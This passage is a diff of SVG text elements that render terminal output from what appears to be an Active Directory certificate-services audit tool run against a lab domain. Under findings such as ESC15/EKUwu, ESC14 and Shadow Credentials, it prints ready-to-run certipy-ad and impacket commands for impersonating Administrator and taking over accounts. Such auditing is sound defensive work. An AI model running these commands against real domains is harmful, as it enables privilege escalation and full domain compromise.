+<text x="493.6" y="2356.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2374.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered (&#x27;No route to host&#x27; / endpoint mapper) — use Kerberos:</text>
+<text x="133.4" y="2391.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="258.7" y="2391.5" fill="#39c5cf" xml:space="preserve">corp.local/administrateur:&#x27;P@ssw0rd!&#x27;</text>
+<text x="556.3" y="2391.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="611.1" y="2391.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2409.0" fill="#3fb950" font-weight="bold" xml:space="preserve">export</text>
+<text x="188.3" y="2409.0" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="133.4" y="2426.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2426.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2426.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2426.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2426.5" fill="#d29922" xml:space="preserve">-k</text>
+<text x="517.1" y="2426.5" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="587.6" y="2426.5" fill="#d29922" xml:space="preserve">-target</text>
+<text x="650.2" y="2426.5" fill="#39c5cf" xml:space="preserve">&#x27;DC01.corp.local&#x27;</text>
+<text x="791.2" y="2426.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="846.0" y="2426.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="939.9" y="2426.5" fill="#d29922" xml:space="preserve">-ns</text>
+<text x="971.3" y="2426.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="1065.2" y="2426.5" fill="#d29922" xml:space="preserve">-dns-tcp</text>
+<text x="1135.7" y="2426.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="1167.0" y="2426.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="1245.3" y="2426.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="1323.6" y="2426.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC15-Test&#x27;</text>
+<text x="1425.4" y="2426.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1464.5" y="2426.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="133.4" y="2444.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2444.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2444.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2444.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2444.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2444.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="31.7" y="2461.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="2461.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC15 — 3 vulnerable template(s)</text>
+<text x="86.5" y="2479.0" fill="#6e7681" xml:space="preserve">V1 templates copy an attacker-supplied Application Policies extension from the CSR. Inject Client Authentication (or Certificate Request Agent) to turn this cert into an auth cert for an arbitrary UPN.</text>
+<text x="86.5" y="2496.5" fill="#6e7681" xml:space="preserve">Enrollable by a principal the current identity controls:</text>
+<text x="86.5" y="2514.0" fill="#6e7681" xml:space="preserve">  - Serveur Web  (enrollable by: Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2531.5" fill="#6e7681" xml:space="preserve"># EKUwu (CVE-2024-49019): inject an Application Policy into a V1 template.</text>
+<text x="133.4" y="2549.0" fill="#6e7681" xml:space="preserve"># Scenario A — direct impersonation (inject Client Authentication):</text>
+<text x="133.4" y="2566.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2566.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2566.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2566.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2566.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2566.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2566.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2566.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;WebServer&#x27;</text>
+<text x="1041.7" y="2566.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1080.9" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="1292.3" y="2566.5" fill="#d29922" xml:space="preserve">-sid</text>
+<text x="1331.4" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;target-SID&gt;&#x27;</text>
+<text x="1448.9" y="2566.5" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1621.2" y="2566.5" fill="#39c5cf" xml:space="preserve">&#x27;Client Authentication&#x27;</text>
+<text x="133.4" y="2584.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2584.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2584.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2584.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2584.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2584.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2601.5" fill="#6e7681" xml:space="preserve"># Scenario B — inject Certificate Request Agent, then enroll on-behalf-of (ESC3-style):</text>
+<text x="133.4" y="2619.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2619.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2619.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2619.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2619.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2619.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2619.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2619.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2619.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2619.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2619.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2619.0" fill="#39c5cf" xml:space="preserve">&#x27;WebServer&#x27;</text>
+<text x="1041.7" y="2619.0" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1214.0" y="2619.0" fill="#39c5cf" xml:space="preserve">&#x27;Certificate Request Agent&#x27;</text>
+<text x="133.4" y="2636.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2636.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2636.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2636.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2636.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2636.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2636.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2636.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2636.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2636.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2636.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2636.5" fill="#39c5cf" xml:space="preserve">User</text>
+<text x="986.9" y="2636.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="1026.1" y="2636.5" fill="#39c5cf" xml:space="preserve">&lt;agent&gt;.pfx</text>
+<text x="1120.0" y="2636.5" fill="#d29922" xml:space="preserve">-on-behalf-of</text>
+<text x="1229.7" y="2636.5" fill="#39c5cf" xml:space="preserve">&#x27;CORP\Administrator&#x27;</text>
+<text x="133.4" y="2654.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered — Kerberos: impacket-getTGT corp.local/administrateur:&#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache ; then add -k -no-pass -target &#x27;DC01.corp.local&#x27; -ns 10.10.10.10 -dns-tcp</text>
+<text x="86.5" y="2671.5" fill="#6e7681" xml:space="preserve">  - Autorité de certification secondaire  (enrollable by: Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2689.0" fill="#6e7681" xml:space="preserve"># EKUwu (CVE-2024-49019): inject an Application Policy into a V1 template.</text>
+<text x="133.4" y="2706.5" fill="#6e7681" xml:space="preserve"># Scenario A — direct impersonation (inject Client Authentication):</text>
+<text x="133.4" y="2724.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2724.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2724.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2724.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2724.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2724.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2724.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2724.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;SubCA&#x27;</text>
+<text x="1010.4" y="2724.0" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1049.6" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="1261.0" y="2724.0" fill="#d29922" xml:space="preserve">-sid</text>
+<text x="1300.1" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;&lt;target-SID&gt;&#x27;</text>
+<text x="1417.6" y="2724.0" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1589.8" y="2724.0" fill="#39c5cf" xml:space="preserve">&#x27;Client Authentication&#x27;</text>
+<text x="133.4" y="2741.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2741.5" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2741.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2741.5" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2741.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2741.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2759.0" fill="#6e7681" xml:space="preserve"># Scenario B — inject Certificate Request Agent, then enroll on-behalf-of (ESC3-style):</text>
+<text x="133.4" y="2776.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2776.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2776.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2776.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2776.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2776.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2776.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2776.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2776.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2776.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2776.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2776.5" fill="#39c5cf" xml:space="preserve">&#x27;SubCA&#x27;</text>
+<text x="1010.4" y="2776.5" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1182.7" y="2776.5" fill="#39c5cf" xml:space="preserve">&#x27;Certificate Request Agent&#x27;</text>
+<text x="133.4" y="2794.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2794.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2794.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2794.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2794.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2794.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2794.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2794.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2794.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2794.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2794.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2794.0" fill="#39c5cf" xml:space="preserve">User</text>
+<text x="986.9" y="2794.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="1026.1" y="2794.0" fill="#39c5cf" xml:space="preserve">&lt;agent&gt;.pfx</text>
+<text x="1120.0" y="2794.0" fill="#d29922" xml:space="preserve">-on-behalf-of</text>
+<text x="1229.7" y="2794.0" fill="#39c5cf" xml:space="preserve">&#x27;CORP\Administrator&#x27;</text>
+<text x="133.4" y="2811.5" fill="#6e7681" xml:space="preserve"># If RPC is filtered — Kerberos: impacket-getTGT corp.local/administrateur:&#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache ; then add -k -no-pass -target &#x27;DC01.corp.local&#x27; -ns 10.10.10.10 -dns-tcp</text>
+<text x="86.5" y="2829.0" fill="#6e7681" xml:space="preserve">  - ESC15-Test  (enrollable by: Domain Users, Domain Admins, Enterprise Admins)</text>
+<text x="133.4" y="2846.5" fill="#6e7681" xml:space="preserve"># EKUwu (CVE-2024-49019): inject an Application Policy into a V1 template.</text>
+<text x="133.4" y="2864.0" fill="#6e7681" xml:space="preserve"># Scenario A — direct impersonation (inject Client Authentication):</text>
+<text x="133.4" y="2881.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2881.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2881.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2881.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2881.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2881.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2881.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2881.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;ESC15-Test&#x27;</text>
+<text x="1049.6" y="2881.5" fill="#d29922" xml:space="preserve">-upn</text>
+<text x="1088.7" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;Administrator@corp.local&#x27;</text>
+<text x="1300.1" y="2881.5" fill="#d29922" xml:space="preserve">-sid</text>
+<text x="1339.3" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;&lt;target-SID&gt;&#x27;</text>
+<text x="1456.7" y="2881.5" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1629.0" y="2881.5" fill="#39c5cf" xml:space="preserve">&#x27;Client Authentication&#x27;</text>
+<text x="133.4" y="2899.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2899.0" fill="#39c5cf" xml:space="preserve">auth</text>
+<text x="258.7" y="2899.0" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="297.9" y="2899.0" fill="#39c5cf" xml:space="preserve">administrator.pfx</text>
+<text x="438.8" y="2899.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="493.6" y="2899.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="133.4" y="2916.5" fill="#6e7681" xml:space="preserve"># Scenario B — inject Certificate Request Agent, then enroll on-behalf-of (ESC3-style):</text>
+<text x="133.4" y="2934.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2934.0" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2934.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2934.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2934.0" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2934.0" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2934.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2934.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2934.0" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2934.0" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2934.0" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2934.0" fill="#39c5cf" xml:space="preserve">&#x27;ESC15-Test&#x27;</text>
+<text x="1049.6" y="2934.0" fill="#d29922" xml:space="preserve">-application-policies</text>
+<text x="1221.8" y="2934.0" fill="#39c5cf" xml:space="preserve">&#x27;Certificate Request Agent&#x27;</text>
+<text x="133.4" y="2951.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="219.6" y="2951.5" fill="#39c5cf" xml:space="preserve">req</text>
+<text x="250.9" y="2951.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="274.4" y="2951.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="493.6" y="2951.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="517.1" y="2951.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="611.1" y="2951.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="665.9" y="2951.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="759.9" y="2951.5" fill="#d29922" xml:space="preserve">-ca</text>
+<text x="791.2" y="2951.5" fill="#39c5cf" xml:space="preserve">&#x27;corp-CA&#x27;</text>
+<text x="869.5" y="2951.5" fill="#d29922" xml:space="preserve">-template</text>
+<text x="947.8" y="2951.5" fill="#39c5cf" xml:space="preserve">User</text>
+<text x="986.9" y="2951.5" fill="#d29922" xml:space="preserve">-pfx</text>
+<text x="1026.1" y="2951.5" fill="#39c5cf" xml:space="preserve">&lt;agent&gt;.pfx</text>
+<text x="1120.0" y="2951.5" fill="#d29922" xml:space="preserve">-on-behalf-of</text>
+<text x="1229.7" y="2951.5" fill="#39c5cf" xml:space="preserve">&#x27;CORP\Administrator&#x27;</text>
+<text x="133.4" y="2969.0" fill="#6e7681" xml:space="preserve"># If RPC is filtered — Kerberos: impacket-getTGT corp.local/administrateur:&#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 &amp;&amp; export KRB5CCNAME=administrateur.ccache ; then add -k -no-pass -target &#x27;DC01.corp.local&#x27; -ns 10.10.10.10 -dns-tcp</text>
+<text x="31.7" y="2986.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="2986.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC5 — non-privileged control over 1 PKI object(s)</text>
+<text x="86.5" y="3004.0" fill="#6e7681" xml:space="preserve">A non-privileged principal can take over PKI infrastructure object(s) → CA / forest compromise:</text>
+<text x="86.5" y="3021.5" fill="#6e7681" xml:space="preserve">  - NTAuthCertificates — publish a rogue CA cert → forge any auth</text>
+<text x="86.5" y="3039.0" fill="#6e7681" xml:space="preserve">      CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=lab</text>
+<text x="86.5" y="3056.5" fill="#6e7681" xml:space="preserve">      controlled by: corp.local\lowpriv</text>
+<text x="86.5" y="3074.0" fill="#6e7681" xml:space="preserve">Confirm &amp; map the PKI: certipy-ad find -u &#x27;administrateur@corp.local&#x27; -p &#x27;P@ssw0rd!&#x27; -dc-ip 10.10.10.10 -stdout -text</text>
+<text x="31.7" y="3091.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="3091.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">ESC14 — weak explicit cert mapping on 1 account(s)</text>
+<text x="86.5" y="3109.0" fill="#6e7681" xml:space="preserve">Account(s) carry a weak altSecurityIdentities mapping (subject / issuer+subject / RFC822-email based). An attacker who obtains a certificate matching the mapping authenticates AS that account — critical when the account is privileged.</text>
+<text x="86.5" y="3126.5" fill="#6e7681" xml:space="preserve">Accounts: svc-app</text>
+<text x="86.5" y="3144.0" fill="#6e7681" xml:space="preserve"># Confirm exploitability — read the DC KDC strong-mapping enforcement (remote registry; usually needs admin):</text>
+<text x="86.5" y="3161.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-reg</text>
+<text x="188.3" y="3161.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!@10.10.10.10&#x27;</text>
+<text x="579.8" y="3161.5" fill="#39c5cf" xml:space="preserve">query</text>
+<text x="626.7" y="3161.5" fill="#d29922" xml:space="preserve">-keyName</text>
+<text x="697.2" y="3161.5" fill="#39c5cf" xml:space="preserve">&#x27;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&#x27;</text>
+<text x="1049.6" y="3161.5" fill="#d29922" xml:space="preserve">-v</text>
+<text x="1073.0" y="3161.5" fill="#39c5cf" xml:space="preserve">StrongCertificateBindingEnforcement</text>
+<text x="86.5" y="3179.0" fill="#6e7681" xml:space="preserve">#   0 disabled / 1 compatibility  → weak mappings honored (EXPLOITABLE)</text>
+<text x="86.5" y="3196.5" fill="#6e7681" xml:space="preserve">#   2 full enforcement            → weak mappings rejected (NOT exploitable)</text>
+<text x="86.5" y="3214.0" fill="#6e7681" xml:space="preserve"># Schannel side (TLS client-cert auth):</text>
+<text x="86.5" y="3231.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-reg</text>
+<text x="188.3" y="3231.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!@10.10.10.10&#x27;</text>
+<text x="579.8" y="3231.5" fill="#39c5cf" xml:space="preserve">query</text>
+<text x="626.7" y="3231.5" fill="#d29922" xml:space="preserve">-keyName</text>
+<text x="697.2" y="3231.5" fill="#39c5cf" xml:space="preserve">&#x27;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel&#x27;</text>
+<text x="1221.8" y="3231.5" fill="#d29922" xml:space="preserve">-v</text>
+<text x="1245.3" y="3231.5" fill="#39c5cf" xml:space="preserve">CertificateMappingMethods</text>
+<text x="86.5" y="3249.0" fill="#6e7681" xml:space="preserve"># Functional confirmation as low-priv (no admin): obtain a cert matching a weak mapping and authenticate as the victim:</text>
+<text x="86.5" y="3266.5" fill="#6e7681" xml:space="preserve">#   certipy-ad auth -pfx &lt;matching-cert&gt;.pfx -dc-ip 10.10.10.10 -domain corp.local</text>
+<text x="86.5" y="3284.0" fill="#6e7681" xml:space="preserve"># Setup vector (who can SET altSecurityIdentities on a victim) is an ACL finding — see the ACLs module / certipy-ad find.</text>
+<text x="31.7" y="3301.5" fill="#ff7b72" font-weight="bold" xml:space="preserve">[CRITICAL]</text>
+<text x="117.8" y="3301.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Shadow Credentials — 1 critical-risk object(s)</text>
+<text x="86.5" y="3319.0" fill="#6e7681" xml:space="preserve">msDS-KeyCredentialLink → PKINIT as the target and NT-hash recovery.</text>
+<text x="86.5" y="3336.5" fill="#6e7681" xml:space="preserve">Key credentials on PRIVILEGED accounts (krbtgt / DC / admin) — a planted key here is full compromise / persistence. Verify each creation time against a known enrollment:</text>
+<text x="86.5" y="3354.0" fill="#6e7681" xml:space="preserve">  - svc-app (User, 1 key(s), created 2026-11-16)</text>
+<text x="86.5" y="3371.5" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="172.6" y="3371.5" fill="#39c5cf" xml:space="preserve">shadow</text>
+<text x="227.4" y="3371.5" fill="#39c5cf" xml:space="preserve">auto</text>
+<text x="266.6" y="3371.5" fill="#d29922" xml:space="preserve">-u</text>
+<text x="290.1" y="3371.5" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="509.3" y="3371.5" fill="#d29922" xml:space="preserve">-p</text>
+<text x="532.8" y="3371.5" fill="#39c5cf" xml:space="preserve">&#x27;P@ssw0rd!&#x27;</text>
+<text x="626.7" y="3371.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="681.5" y="3371.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="775.5" y="3371.5" fill="#d29922" xml:space="preserve">-account</text>
+<text x="846.0" y="3371.5" fill="#39c5cf" xml:space="preserve">svc-app</text>
+<text x="86.5" y="3389.0" fill="#6e7681" xml:space="preserve"># Kerberos (signing-enforced DC):</text>
+<text x="102.1" y="3406.5" fill="#3fb950" font-weight="bold" xml:space="preserve">impacket-getTGT</text>
+<text x="227.4" y="3406.5" fill="#39c5cf" xml:space="preserve">&#x27;corp.local/administrateur:P@ssw0rd!&#x27;</text>
+<text x="525.0" y="3406.5" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="579.8" y="3406.5" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="673.7" y="3406.5" fill="#39c5cf" xml:space="preserve">&amp;&amp;</text>
+<text x="697.2" y="3406.5" fill="#39c5cf" xml:space="preserve">export</text>
+<text x="752.0" y="3406.5" fill="#39c5cf" xml:space="preserve">KRB5CCNAME=administrateur.ccache</text>
+<text x="102.1" y="3424.0" fill="#3fb950" font-weight="bold" xml:space="preserve">certipy-ad</text>
+<text x="188.3" y="3424.0" fill="#39c5cf" xml:space="preserve">shadow</text>
+<text x="243.1" y="3424.0" fill="#39c5cf" xml:space="preserve">auto</text>
+<text x="282.2" y="3424.0" fill="#d29922" xml:space="preserve">-u</text>
+<text x="305.7" y="3424.0" fill="#39c5cf" xml:space="preserve">&#x27;administrateur@corp.local&#x27;</text>
+<text x="525.0" y="3424.0" fill="#d29922" xml:space="preserve">-k</text>
+<text x="548.4" y="3424.0" fill="#d29922" xml:space="preserve">-no-pass</text>
+<text x="618.9" y="3424.0" fill="#d29922" xml:space="preserve">-dc-ip</text>
+<text x="673.7" y="3424.0" fill="#39c5cf" xml:space="preserve">10.10.10.10</text>
+<text x="767.7" y="3424.0" fill="#d29922" xml:space="preserve">-account</text>
+<text x="838.1" y="3424.0" fill="#39c5cf" xml:space="preserve">svc-app</text>
+<text x="31.7" y="3441.5" fill="#d29922" font-weight="bold" xml:space="preserve">[HIGH]</text>
+<text x="86.5" y="3441.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">MachineAccountQuota = 10</text>
+<text x="86.5" y="3459.0" fill="#6e7681" xml:space="preserve">Any authenticated user can add machine accounts to the domain — enables RBCD attacks.</text>
+<text x="86.5" y="3476.5" fill="#6e7681" xml:space="preserve"># 1) create a machine account (MachineAccountQuota &gt; 0):</text>
